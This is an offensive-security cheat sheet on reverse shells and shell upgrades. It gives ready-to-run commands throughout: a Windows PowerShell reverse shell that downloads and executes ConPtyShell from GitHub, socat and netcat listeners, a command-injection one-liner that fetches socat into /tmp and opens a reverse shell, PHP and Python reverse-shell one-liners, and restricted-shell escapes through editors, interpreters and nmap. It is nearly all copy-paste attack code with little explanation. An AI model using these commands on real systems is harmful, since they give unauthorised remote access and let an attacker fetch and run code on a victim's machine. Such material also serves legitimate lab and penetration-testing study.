# ⭕ Shell Escape / Interactive TTY

## windows interactive reverse powershell

{% embed url="https://github.com/antonioCoco/ConPtyShell" %}

#### Server (attacker) Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

#### Client Side (directly load from git repository):

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 3001
```

#### or, if you upload the ps1:

```
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
```

#### or download the reverse shell and upload it to target yourself

```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
IEX(IWR http://192.168.56.1/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 9999
```

## Linux Interactive Shell

### check $SHELL and $PATH

fix the path problem if you cant access default shells

```
export PATH=/bin:/usr/bin:$PATH
```

### Using Python & STTY

#### In your current non-interactive reverse shell type:

```
 python -c 'import pty; pty.spawn("/bin/bash")'
```

#### press Ctrl+z to send the shell to background

#### then in the same terminal type in:

```
echo $TERM >>> take note of terminal name
stty -a >>> take note of raws and columns numbers
stty raw -echo
fg
```

#### then you will have an empty terminal, type these:

```
 reset
 export SHELL=bash
 export TERM=xterm-256color  OR export TERM=xterm
stty rows <num> columns <cols>
```

### Using /usr/bin/script

#### in your current non-interactive reverse shell type in:

```
 /usr/bin/script -qc /bin/bash /dev/null
```

the rest is like the above method, we just use /usr/bin/script if python is not installed

### Using Socat & STTY

attacker:

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

victim:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

{% embed url="https://github.com/andrew-d/static-binaries" %}

With a command injection vuln, it’s possible to download the correct architecture socat binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Semi-interactive Spawn & Escape

### ​​rbash escape through SSH

```
ssh hackNos@<IP-Adress> -t "bash --noprofile"
```

### rbash escape through editors

```
vi
:set shell=/bin/bash
:shell
```

### escaping rbash – editor

```
ed
!'/bin/bash'
pwd
```

### escape rbash through reverse shell

```
nc -lvp 4545
php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### rbash escape Awk

```
awk 'BEGIN {system("/bin/bash")}'
```

### interpreters

```
python -c 'import pty; pty.spawn("/bin/sh");'  
python3 -c 'import os; os.system("/bin/bash");'
perl -e 'exec "/bin/sh";'
ruby -e ‘exec "/bin/sh"’
lua -e 'os.execute('/bin/sh')'
```

### rbash bypass through binary file

```
less anyfile.txt
!'bash'
```

### sh

```
/usr/bin/script -qc /bin/bash /dev/null
echo os.system('/bin/bash')
/bin/sh -i
exec "/bin/sh"
```

### ​​within nmap

```
!sh
```

### rlwrap for Making the Shell Semi-interactive

```
# use with netcat or other shells
rlwrap nc -nvlp 1234
```

### in meterpreter

```
execute -f cmd.exe -H -c -i
```
